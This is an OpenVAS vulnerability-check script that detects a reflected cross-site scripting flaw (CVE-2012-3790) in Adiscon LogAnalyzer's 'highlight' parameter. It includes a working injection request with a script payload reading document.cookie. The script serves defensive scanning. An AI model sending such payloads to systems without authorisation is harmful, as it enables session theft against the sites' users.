##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_loganalyzer_highlight_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Adiscon LogAnalyzer 'highlight' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Adiscon LogAnalyzer versions before 3.4.4 and 3.5.x before 3.5.5";
tag_insight = "Input passed via the 'highlight' parameter in index.php is not properly
  verified before it is returned to the user. This can be exploited to execute
  arbitrary HTML and script code in a user's browser session in the context of
  a vulnerable site.";
tag_solution = "Upgrade to Adiscon LogAnalyzer version 3.4.4 or 3.5.5 or later,
  For updates refer to http://loganalyzer.adiscon.com/";
tag_summary = "This host is running Adiscon LogAnalyzer and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_id(802645);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-3790");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-06-21 11:11:11 +0530 (Thu, 21 Jun 2012)");
  script_name("Adiscon LogAnalyzer 'highlight' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=504");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_LogAnalyzer_XSS_Vuln.txt");
  script_xref(name : "URL" , value : "http://loganalyzer.adiscon.com/downloads/loganalyzer-3-4-4-v3-stable");
  script_xref(name : "URL" , value : "http://loganalyzer.adiscon.com/downloads/loganalyzer-v3-5-5-v3-beta");
  script_xref(name : "URL" , value : "http://loganalyzer.adiscon.com/security-advisories/loganalyzer-cross-site-scripting-vulnerability-in-highlight-parameter");

  script_description(desc);
  script_summary("Check if LogAnalyzer is vulnerable to cross site scripting");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/loganalyzer", "/log", cgi_dirs()))
{
  url = dir + "/index.php";

  ## Confirm the application before trying exploit
  if(http_vuln_check(port: port, url: url, check_header: TRUE,
     pattern: ">Adiscon LogAnalyzer<"))
  {
    ## Construct attack request
    url += '/?search=Search&highlight="<script>alert(document.cookie)</script>';

    ## Try XSS and check the response to confirm vulnerability
    if(http_vuln_check( port: port, url: url, check_header: TRUE,
                        pattern: "<script>alert\(document.cookie\)</script>",
                        extra_check: ">Adiscon LogAnalyzer<"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
